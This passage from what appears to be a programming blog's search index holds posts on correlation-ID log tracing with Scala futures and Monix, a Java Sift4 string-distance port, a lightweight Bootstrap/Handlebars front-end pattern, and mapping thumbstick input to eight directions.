use this technique.  However, in asynchronous code this approach doesn't work because we have different parts of our code running on different threads in a pool. If you've used Twitter <code>Future</code>s with Zipkin you may have noticed that you have asynchronous code and working tracing, but that tracing breaks if you use Scala's <code>Future</code> instead of Twitter's. This is because Twitter's <code>Future</code>s do something called local context propagation that Scala's do not, and therefore some things do not work so well outside Twitter's ecosystem.</p> <p>In this article we'll cover an example system with two services (using Akka HTTP and plain old Scala <code>Future</code>s) that does some logging. Then we'll add some performance monitoring to our logs. Finally we'll start using correlation IDs to tie everything together.</p>"},{"location":"2019/09/10/log-tracing-with-plain-old-scala-futures/#example-system","title":"Example System","text":"<p>Let's say we have a simple system with two services; a and b. Outside requests come in to a, which sends a random greeting to b, who simply logs the greeting and replies with thanks which a sends back to the external caller. </p> <p>Both services use a simple logging directive to record request information and how long the request took to complete.</p> <p>If we do a simple <code>curl http://localhost:8080</code></p> <p>then we see that a logs</p> <p>[my-system-akka.actor.default-dispatcher-5] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 214ms</p> <p>and b logs</p> <p>[my-system-akka.actor.default-dispatcher-6] INFO b.Service - a says 'Konnichiwa B' [my-system-akka.actor.default-dispatcher-6] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 27ms</p> <p>Source code for the example and the rest of the article can be found on github.</p>"},{"location":"2019/09/10/log-tracing-with-plain-old-scala-futures/#timing","title":"Timing","text":"<p>So far we have two running services, each with some basic logging. </p> <p>Now suppose we want to keep track of how much time the request spends in different parts of the system. </p> <p>We could tweak a's service to measure how long it takes to receive b's response.</p> <p>[my-system-akka.actor.default-dispatcher-4] INFO a.Service - b took 211ms to respond [my-system-akka.actor.default-dispatcher-4] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 221ms</p> <p>This way we could get a fairly granular breakdown of what happened. We have the total time it took to serve the response to the caller, the time it took a to get a response back from b, and the time it took b to process the greeting from a.</p> <p>The problem we have is that given many requests in parallel we have no way of knowing which log entries go together. For example for 5 requests <code>a</code> logs</p> <p>[my-system-akka.actor.default-dispatcher-9] INFO a.Service - b took 220ms to respond [my-system-akka.actor.default-dispatcher-4] INFO a.Service - b took 222ms to respond [my-system-akka.actor.default-dispatcher-9] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 230ms [my-system-akka.actor.default-dispatcher-4] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 231ms [my-system-akka.actor.default-dispatcher-4] INFO a.Service - b took 223ms to respond [my-system-akka.actor.default-dispatcher-4] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 232ms [my-system-akka.actor.default-dispatcher-2] INFO a.Service - b took 224ms to respond [my-system-akka.actor.default-dispatcher-2] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 233ms [my-system-akka.actor.default-dispatcher-4] INFO a.Service - b took 224ms to respond [my-system-akka.actor.default-dispatcher-4] INFO common.LoggingDirective - responded to GET http://localhost:8080/ HTTP/1.1 in 233ms</p> <p>and <code>b</code> logs</p> <p>[my-system-akka.actor.default-dispatcher-4] INFO b.Service - a says 'Zdravstvuyte B' [my-system-akka.actor.default-dispatcher-2] INFO b.Service - a says 'Gr\u00fc\u00df Gott B' [my-system-akka.actor.default-dispatcher-8] INFO b.Service - a says 'Sawubona B' [my-system-akka.actor.default-dispatcher-3] INFO b.Service - a says 'Cze\u015b\u0107 B' [my-system-akka.actor.default-dispatcher-3] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 31ms [my-system-akka.actor.default-dispatcher-2] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 31ms [my-system-akka.actor.default-dispatcher-4] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 31ms [my-system-akka.actor.default-dispatcher-8] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 31ms [my-system-akka.actor.default-dispatcher-9] INFO b.Service - a says 'Namaste B' [my-system-akka.actor.default-dispatcher-9] INFO common.LoggingDirective - responded to POST http://localhost:8081/ HTTP/1.1 in 1ms  </p>"},{"location":"2019/09/10/log-tracing-with-plain-old-scala-futures/#tracing","title":"Tracing","text":"<p>Now we can get into the meat of why you're reading this article. Let's add correlation IDs to all of our logs. We're going to use a Monix <code>Local</code> which is like a thread local, but will be propagated to the new thread when we cross async boundaries.</p> <p>To make the <code>Local</code> available globally we'll just put it in an object </p> <p>Next let's make a directive that will either use a correlation ID from a header in an incoming request (in the case of b) or generate a new one (in the case of a)</p> <p>To make the <code>Local</code> propagate correctly when we use futures we need to wrap the <code>ExecutionContext</code> used by Akka and our services. This basically means we'll create a Monix <code>TracingScheduler</code> from an <code>ExecutionContext</code> and use that when we create our <code>ActorSystem</code>.</p> <p>Now that we have everything set up, we can use <code>CorrelationId.local()</code> in our logs and know that we'll always get an ID unique to the current request.</p> <p>Here's what that looks like in our logging directive and two services</p> <p>Now our <code>a</code> logs have</p> <p>[scala-execution-context-global-12] INFO a.Service - [0NnmzjUxbfk5OZG1kDzb2g] b took 245ms to respond [scala-execution-context-global-19] INFO a.Service - [oo4VS6CW0r7QPtSe2fzHxg] b took 245ms to respond [scala-execution-context-global-11] INFO a.Service - [mlyjVSbzq4-619HTgB5Wag] b took 246ms to respond [scala-execution-context-global-11] INFO common.LoggingDirective - [mlyjVSbzq4-619HTgB5Wag] responded to GET http://localhost:8080/ HTTP/1.1 in 255ms [scala-execution-context-global-12] INFO common.LoggingDirective - [0NnmzjUxbfk5OZG1kDzb2g] responded to GET http://localhost:8080/ HTTP/1.1 in 255ms [scala-execution-context-global-19] INFO common.LoggingDirective - [oo4VS6CW0r7QPtSe2fzHxg] responded to GET http://localhost:8080/ HTTP/1.1 in 255ms [scala-execution-context-global-15] INFO a.Service - [TaPN1vgI6e4sWJbejlGRXg] b took 248ms to respond [scala-execution-context-global-15] INFO common.LoggingDirective - [TaPN1vgI6e4sWJbejlGRXg] responded to GET http://localhost:8080/ HTTP/1.1 in 256ms [scala-execution-context-global-17] INFO a.Service - [7uB87b52T6Ij9gLQkbRYjA] b took 248ms to respond [scala-execution-context-global-17] INFO common.LoggingDirective - [7uB87b52T6Ij9gLQkbRYjA] responded to GET http://localhost:8080/ HTTP/1.1 in 257ms  </p> <p>and <code>b</code> logs have </p> <p>[scala-execution-context-global-13] INFO b.Service - [Zg8AQEaMwAD43krJ0upXAg] a says 'Namaskar B' [scala-execution-context-global-15] INFO b.Service - [Fm3vl3iwKwB3PFj2m0xf4g] a says 'Konnichiwa B' [scala-execution-context-global-18] INFO b.Service - [F5wxknwF86HYV93C8LZP-g] a says 'Shalom B' [scala-execution-context-global-12] INFO b.Service - [UpeEsDRGNUkMwIMTll06hA] a says 'Hola B' [scala-execution-context-global-18] INFO common.LoggingDirective - [F5wxknwF86HYV93C8LZP-g] responded to POST http://localhost:8081/ HTTP/1.1 in 29ms [scala-execution-context-global-12] INFO common.LoggingDirective - [UpeEsDRGNUkMwIMTll06hA] responded to POST http://localhost:8081/ HTTP/1.1 in 29ms [scala-execution-context-global-15] INFO common.LoggingDirective - [Fm3vl3iwKwB3PFj2m0xf4g] responded to POST http://localhost:8081/ HTTP/1.1 in 29ms [scala-execution-context-global-13] INFO common.LoggingDirective - [Zg8AQEaMwAD43krJ0upXAg] responded to POST http://localhost:8081/ HTTP/1.1 in 29ms [scala-execution-context-global-18] INFO b.Service - [8oZkANG1uvQUWinqRQkSXw] a says 'Hallo B' [scala-execution-context-global-18] INFO common.LoggingDirective - [8oZkANG1uvQUWinqRQkSXw] responded to POST http://localhost:8081/ HTTP/1.1 in 1ms</p> <p>Perfect, now we can see which logs go together both on the same service and across services.  The only thing left to do is aggregate logs from a and b into the same place. Stay tuned for an article on structured logging and log aggregation with tools like Loggly and Zipkin!</p>"},{"location":"2019/09/10/log-tracing-with-plain-old-scala-futures/#sidenotes","title":"Sidenotes","text":"<p>On rare occasion a third party library will return a <code>Future</code> without the local context. The Akka HTTP client's <code>Http().singleRequest</code> is one example of this. To work around this we can use this helper method to put the context back in the future.</p>"},{"location":"2016/12/11/sift4-string-comparison-in-java/","title":"Sift4 String Comparison in Java","text":"<p>More of a quick snippet here than a blog post, but for fans of the sift4 string comparison algorithm, here's a java implementation. Hopefully it will be available soon in the handy java string similarity library and on maven central. In the meantime it can be found in its entirety below, or in the original post on siderite's blog.</p> <pre><code>/**\n * Sift4 - common version\n * online algorithm to compute the distance between two strings in O(n)\n * Algorithm by siderite, java port by Nathan Fischer 2016\n * https://siderite.dev/blog/super-fast-and-accurate-string-distance.html\n * @param s1\n * @param s2\n * @param maxOffset the number of characters to search for matching letters\n * @return\n */\npublic static double sift4(String s1, String s2, int maxOffset) {\n    class Offset{\n        int c1;\n        int c2;\n        boolean trans;\n\n        Offset(int c1, int c2, boolean trans) {\n            this.c1 = c1;\n            this.c2 = c2;\n            this.trans = trans;\n        }\n    }\n\n    if(s1 == null || s1.isEmpty())\n        return s2 == null ? 0 : s2.length();\n\n    if(s2 == null || s2.isEmpty())\n        return s1.length();\n\n    int l1=s1.length();\n    int l2=s2.length();\n\n    int c1 = 0;  //cursor for string 1\n    int c2 = 0;  //cursor for string 2\n    int lcss = 0;  //largest common subsequence\n    int local_cs = 0; //local common substring\n    int trans = 0;  //number of transpositions ('ab' vs 'ba')\n    LinkedList&lt;Offset&gt; offset_arr=new LinkedList&lt;&gt;();  //offset pair array, for computing the transpositions\n\n    while ((c1 &lt; l1) &amp;&amp; (c2 &lt; l2)) {\n        if (s1.charAt(c1) == s2.charAt(c2)) {\n            local_cs++;\n            boolean isTrans=false;\n            //see if current match is a transposition\n            int i=0;\n            while (i&lt;offset_arr.size()) {\n                Offset ofs=offset_arr.get(i);\n                if (c1&lt;=ofs.c1 || c2 &lt;= ofs.c2) {\n                    // when two matches cross, the one considered a transposition is the one with the largest difference in offsets\n                    isTrans=Math.abs(c2-c1)&gt;=Math.abs(ofs.c2-ofs.c1);\n                    if (isTrans) {\n                        trans++;\n                    } else {\n                        if (!ofs.trans) {\n                            ofs.trans=true;\n                            trans++;\n                        }\n                    }\n                    break;\n                } else {\n                    if (c1&gt;ofs.c2 &amp;&amp; c2&gt;ofs.c1) {\n                        offset_arr.remove(i);\n                    } else {\n                        i++;\n                    }\n                }\n            }\n            offset_arr.add(new Offset(c1, c2, isTrans));\n        } else {\n            lcss+=local_cs;\n            local_cs=0;\n            if (c1!=c2) {\n                c1=c2=Math.min(c1,c2);  //using min allows the computation of transpositions\n            }\n            //if matching characters are found, remove 1 from both cursors (they get incremented at the end of the loop)\n            //so that we can have only one code block handling matches\n            for (int i = 0; i &lt; maxOffset &amp;&amp; (c1+i&lt;l1 || c2+i&lt;l2); i++) {\n                if ((c1 + i &lt; l1) &amp;&amp; (s1.charAt(c1 + i) == s2.charAt(c2))) {\n                    c1+= i-1;\n                    c2--;\n                    break;\n                }\n                if ((c2 + i &lt; l2) &amp;&amp; (s1.charAt(c1) == s2.charAt(c2 + i))) {\n                    c1--;\n                    c2+= i-1;\n                    break;\n                }\n            }\n        }\n        c1++;\n        c2++;\n        // this covers the case where the last match is on the last token in list, so that it can compute transpositions correctly\n        if ((c1 &gt;= l1) || (c2 &gt;= l2)) {\n            lcss+=local_cs;\n            local_cs=0;\n            c1=c2=Math.min(c1,c2);\n        }\n    }\n    lcss+=local_cs;\n    return Math.round(Math.max(l1,l2)- lcss +trans); //add the cost of transpositions to the final result\n}\n</code></pre>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/","title":"Web app front ends for people who don't want to have to continually re-learn front end","text":"<p>If you're a javscript/front end developer who follows the latest sophisticated frameworks, or a lead with a team of rockstar front end developers looking to build the best app your designer can conceive of; then this isn't for you.</p> <p>Not every tool and technology is right for every task or situation. These are the driving goals for the approach outlined below</p> <ol> <li>Simplicity<ul> <li>Minimize the number of dependencies / imports</li> <li>Minimize prerequisite knowledge</li> <li>Minimize code complexity</li> </ul> </li> <li>Stability<ul> <li>Dependencies / imports used should still be maintained years from now, and should have very few breaking changes in that time</li> </ul> </li> <li>Scalability<ul> <li>In performance, the number of active users should not impact the front end itself</li> <li>In functionality (if not design), we can implement an interface to work with a modern back-end API (we could implement amazon, but not lucidchart)</li> </ul> </li> </ol> <p>With that said, some context on the range of front end's out there</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#glamp","title":"GLAMP","text":"<p>The Good old LinuxApacheMysqlPhp stack. This isn't strictly LAMP, but generally anything which renders dynamic data into HTML on the back end and returns it to the browser.</p> <ul> <li>Synchronous<ul> <li>What's shown to the user is driven by a user interaction resulting in loading new pages </li> </ul> </li> <li>Server side rendering</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#pros","title":"Pros","text":"<ul> <li>Can be very performant on low end devices since there is little or no javascript running</li> <li>Pages with data from many sources may load faster because of better network performance between the front end server and the data sources compared to the browser and the back end / data sources</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#cons","title":"Cons","text":"<ul> <li>Performance scales poorly, because pages cannot be cached</li> <li>New content requires a page reload</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#spa","title":"SPA","text":"<p>The modern Single Page Application is largely script driven. </p> <ul> <li>Asynchronous <ul> <li>What's shown on to the user is driven by user interaction or programmatic event resulting in scripts changing some content on the current page</li> </ul> </li> <li>Client side rendering<ul> <li>Little or no HTML is delivered to the browser. Rather, javscript creates all the elements on the page (granted, some modern frameworks support server side rendering for the initial state, and are script driven after that).</li> </ul> </li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#pros_1","title":"Pros","text":"<ul> <li>Most frameworks provide powerful two-way data binding to template and update what's on the page at any time without reloading</li> <li>Feels more like a traditional desktop application </li> <li>Static scripts can be hosted on a CDN and scale well</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#cons_1","title":"Cons","text":"<ul> <li>May perform poorly on lower end devices due to being script driven</li> <li>First load may be slower due to the entire app needing to be sent at once</li> <li>Mix of versioning, technologies, and compatibility can result in complicated build processes with polyfilling, transpiling, and dependency resolution</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#somewhere-in-the-middle","title":"Somewhere in the middle","text":"<p>What we'll cover today. * (mostly) Synchronous * Client side rendering     * Static HTML is delivered to the browser, but a small script provides the data for the dynamic content</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#pros_2","title":"Pros","text":"<ul> <li>Performs well across a range of devices</li> <li>Static parts of pages can be cached and hosted on a CDN</li> <li>Simplicity reduces learning curve</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#cons_2","title":"Cons","text":"<ul> <li>New or refreshed content is accessed by a page reload, but that shouldn't be as much of a problem as it is with server side rendering since most of the page is cached</li> </ul>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#solution","title":"Solution","text":"<p>So what are we actually talking about? In short it's two (three) dependencies:</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#bootstrap","title":"Bootstrap","text":"<p>Bootstrap makes it easy to quickly set up the style and layout of a page. It's been around since 2011 and hasn't changed too radically since then, but it has grown an abundance of documentation, community support, and usage guides. If you were inclined you could swap this out with any other library that does styling and layout like Google's material design for web. </p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#jquery","title":"jQuery","text":"<p>jQuery is a transitive dependency from bootstrap, we'll only really use it directly to DRY up parts of our pages like headers and footers. </p> <p>This requires import of the full jQuery library as opposed to the slim version required by boostrap. To optimize performance we could use handlebars partials instead of jQuery for the headers and footers.</p> <p>When it comes to web libraries that are widely used, stable, and not going anywhere there is nothing that comes close to jQuery.</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#handlebars","title":"Handlebars","text":"<p>From its readme:</p> <p>Handlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.</p> <p>Since 2012 handlebars has been the go-to javascript templating library. We'll use it to populate the parts of our pages which contain dynamic content (and very importantly, it will take care of escaping data to prevent code injection).</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#fetch","title":"fetch","text":"<p>Goodbye XMLHttpRequest!  I know I said three dependencies, but fetch is built into the browser making it a very reliable choice and technically not a dependency.</p> <p>note: fetch is not supported in internet explorer, so if you need to support legacy browsers you'll want to use github's fetch polyfil</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#the-pattern","title":"The pattern","text":"<p>The pattern is very simple 1. Make a page for each view using bootstrap 2. Use handlebars to template out the portions containing dynamic content 3. When the page loads, use fetch to retrieve data from the back end 4. Populate the template with the data and inject it into the page</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#example","title":"Example","text":"<p>You can see a demo of a typical app with login built this way here (log in with any username and password).</p> <p>Content pages like this one are very simple at just over 60 lines long.</p> <p>Closing note: in contrast to the example app, you will want to precompile your handlebars templates. This will allow your pages to load much faster since the templates don't need to be compiled on each page load. All you need to do is include the precompiled templates in a script tag. You can see the same example app with precompiled templates here.</p>"},{"location":"2018/12/16/web-app-front-ends-for-people-who-dont-want-to-have-to-continually-re-learn-front-end/#resources","title":"Resources","text":"<p>https://htmldom.dev - see how to do simple to advanced functionality in vanilla JS</p>"},{"location":"2016/08/10/converting-thumbstick-input-to-useful-n-directional-input/","title":"Converting Thumbstick Input to Useful N-Directional Input","text":"<p>When developing a game, one of the major hurdles is converting information from input devices (whether mouse, keyboard, controller, or something else) into useful information that your game engine can use to update the game's state.</p> <p>In this article, we are going to specifically focus on how to translate the typical information given by a controller's thumbsticks into more useable data.</p>"},{"location":"2016/08/10/converting-thumbstick-input-to-useful-n-directional-input/#the-problem","title":"The Problem","text":"<p>Let's pretend that we are developing an adventure game called Pete the Pirate. In our game, we want our character Pete to be constrained to the 8 traditional directions as indicated in the image below. Pete can be facing in any of these 8 directions, and only these directions.  When he moves, he is locked to them, and when he swings his cutlass the hitbox will use his current facing direction for placement.</p> <p></p> <p>When using a keyboard, this system is easy to implement.  All we need to do is check which movement keys are pressed, and update Pete accordingly.  A snippet of our input code might look like this:</p> <pre><code>void updateFacingDirection()\n{\n    if(UP.Pressed)\n    {\n        setFacing(UP);\n    }\n    else if(DOWN.Pressed)\n    {\n        setFacing(DOWN)\n    }\n\n    ...\n\n    if(UP.Pressed &amp;&amp; LEFT.Pressed)\n    {\n        setFacing(UP-LEFT)\n    }\n}\n</code></pre> <p>Of course, there is nothing elegant or simple about this system -- but it works.</p> <p>However, whereas keyboard inputs are discrete, the data from our controller's thumbsticks are analog. Each thumbstick records two floating point values, generally between -1.0f and 1.0f, which indicate the current value of the X and Y axes.  For instance, pulling the thumbstick to the far left would give an X-Axis value of -1.0f, and having the stick in the middle would give us 0.0f on the X-Axis, and 0.0f on the Y-Axis.</p> <p>Updating our previous code for the controller might look like this:</p> <pre><code>void updateFacingDirection()\n{\n    if(ThumbstickY &gt; 0.0f)\n    {\n        setFacing(UP);\n    }\n    else if(ThumbstickY &lt; 0.0f)\n    {\n        setFacing(DOWN)\n    }\n\n    ...\n\n    if(ThumbstickY &gt; 0.0f &amp;&amp; ThumbstickX &lt; 0.0f)\n    {\n        setFacing(UP-LEFT)\n    }\n}\n</code></pre> <p>But what happens if the player isn't precise with their thumbstick control? Imagine pushing your thumbstick straight up.  In a perfect scenario, Pete would be set to the UP direction, and would walk upward.  But what if our thumbstick isn't perfectly straight up and our controller reads a Y-Axis value of 1.0f (straight up) and an X-Axis value of 0.02f (slightly to the right)?  Suddenly, Pete is set to the facing of UP-RIGHT, and walks the wrong direction!</p> <p>When we treat thumbstick inputs as discrete inputs, it becomes very difficult for the player to put the thumbstick in a cardinal direction.  A vast majority of the time, they will find themselves moving along one of the diagonal directions!</p> <p>Our intended behavior is that the 360-degrees of rotation for the thumbstick is treated as 8 separate 45-degree sectors. If the thumbstick is in the upper 45-degree sector (which spans 22.5 degrees on either side of straight up), Pete will face the UP direction.  If the thumbstick is in the next sector clock-wise (from 22.5 to 67.5), Pete will face the UP-RIGHT direction.  This is illustrated below.</p> <p></p> <p>But how to we convert our current thumbstick data into this more useful format?</p>"},{"location":"2016/08/10/converting-thumbstick-input-to-useful-n-directional-input/#step-1-converting-from-cartesian-to-polar-coordinates","title":"Step 1: Converting from Cartesian to Polar Coordinates","text":"<p>The first thing we have to do to correct this problem is to convert the X and Y values (which are Cartesian coordinates) into more useful ones.</p> <p>Instead of an X and Y-Axes values, we want to know the angle from straight up that our thumbstick is facing, and the distance from the center that the thumbstick is pressed.  This, of course, is a Polar coordinate.</p> <p></p> <p>Luckily for us, there is no need to reinvent the wheel.  Mathematics provides the answer! Here is how to get this angle using C#.</p> <pre><code>double getAngleFromXY(float XAxisValue, float YAxisValue)\n{\n    //Normally Atan2 takes Y,X, not X,Y.  We switch these around since we want 0\n    // degrees to be straight up, not to the right like the unit circle;\n    double angleInRadians = Math.Atan2(XAxisValue, YAXisValue);\n\n    //Atan2 gives us a negative value for angles in the 3rd and 4th quadrants.\n    // We want a full 360 degrees, so we will add 2 PI to negative values.\n    if(angleInRadians &lt; 0.0f) angleInRadians += (Math.PI * 2.0f);\n\n    //Convert the radians to degrees.  Degrees are easier to visualize.\n    double angleInDegrees = (180.0f * angleInRadians / Math.PI); \n\n    return angleInDegrees;\n}\n</code></pre>"},{"location":"2016/08/10/converting-thumbstick-input-to-useful-n-directional-input/#step-2-converting-our-angle-to-a-direction","title":"Step 2: Converting our Angle to a Direction","text":"<p>Once we have our angle, converting that to a direction is actually very easy.  Here's the code:</p> <pre><code>int convertXYtoDirection(float X, float Y)\n{\n    //We have 8 sectors, so get the size of each in degrees.\n    double sectorSize = 360.0f / 8;\n\n    //We also need the size of half a sector\n    double halfSectorSize = sectorSize / 2.0f;\n\n    //First, get the angle using the function above\n    double thumbstickAngle = getAngleFromXY(X, Y);\n\n    //Next, rotate our angle to match the offset of our sectors.\n    double convertedAngle = thumbstickAngle + halfSectorSize;\n\n    //Finally, we get the current direction by dividing the angle\n    // by the size of the sectors\n    int direction = (int)Math.Floor(convertedAngle / sectorSize);\n\n    //the result directions map as follows:\n    // 0 = UP, 1 = UP-RIGHT, 2 = RIGHT ... 7 = UP-LEFT.\n    return direction;\n}\n</code></pre> <p>Now our game engine is able to take raw controller thumbstick data and match those inputs to our 8 directions, and all it took was a few lines of math!</p>"},{"location":"2016/08/10/converting-thumbstick-input-to-useful-n-directional-input/#more-fun","title":"More Fun","text":"<p>This method can also be used to map thumbstick data to any N facing directions.  All we need to do is change the number in our <code>convertXYtoDirection()</code> function to reflect how many sectors we have.  Keep in mind that sector 0 will always be evenly spaced around \"UP\".</p>"},{"location":"archive/2023/","title":"2023","text":""},{"location":"archive/2020/","title":"2020","text":""},{"location":"archive/2019/","title":"2019","text":""},{"location":"archive/2018/","title":"2018","text":""},{"location":"archive/2017/","title":"2017","text":""},{"location":"archive/2016/","title":"2016","text":""},{"location":"archive/1970/","title":"1970","text":""},{"location":"category/blog/","title":"Blog","text":""},{"location":"page/2/","title":"Home","text":""},{"location":"category/blog/page/2/","title":"Blog","text":""}]}